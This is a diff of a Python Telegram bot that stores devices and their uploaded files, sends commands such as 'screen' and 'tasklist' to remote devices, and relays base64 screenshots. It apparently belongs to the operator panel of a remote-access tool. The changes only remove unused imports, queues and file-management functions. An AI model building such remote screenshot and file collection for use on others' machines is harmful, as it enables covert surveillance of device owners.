@@ -5,7 +5,7 @@ import sqlite3
 import time
 import json
 import re
-from datetime import datetime, timedelta
+from datetime import datetime
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
@@ -23,8 +23,6 @@ dp = Dispatcher()
 # Хранилища
 screenshot_buffers = {}
 file_buffers = {}
-command_queue = {}
-pending_commands = {}
 
 # --- БАЗА ДАННЫХ ---
 DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")
@@ -130,21 +128,6 @@ def save_file_to_db(device_id, filename, content):
     cursor = conn.cursor()
     cursor.execute("INSERT INTO files (device_id, filename, content, uploaded_at) VALUES (?, ?, ?, ?)",
                    (device_id, filename, content, int(time.time())))
-    conn.commit()
-    conn.close()
-
-def get_files_from_device(device_id):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("SELECT id, filename, uploaded_at FROM files WHERE device_id = ?", (device_id,))
-    rows = cursor.fetchall()
-    conn.close()
-    return rows
-
-def delete_file_from_db(file_id):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("DELETE FROM files WHERE id = ?", (file_id,))
     conn.commit()
     conn.close()
 
@@ -412,7 +395,6 @@ async def send_command(callback: types.CallbackQuery):
     cmd_type = parts[1]
     device_id = "_".join(parts[2:])
     
-    # Маппинг команд
     cmd_map = {
         "screen": "screen",
         "tasklist": "tasklist",
@@ -647,7 +629,6 @@ async def handle_channel_messages(message: types.Message):
             if len(parts) < 2:
                 return
             base64_img = parts[1]
-            
             img_bytes = base64.b64decode(base64_img)
             
             await bot.send_photo(
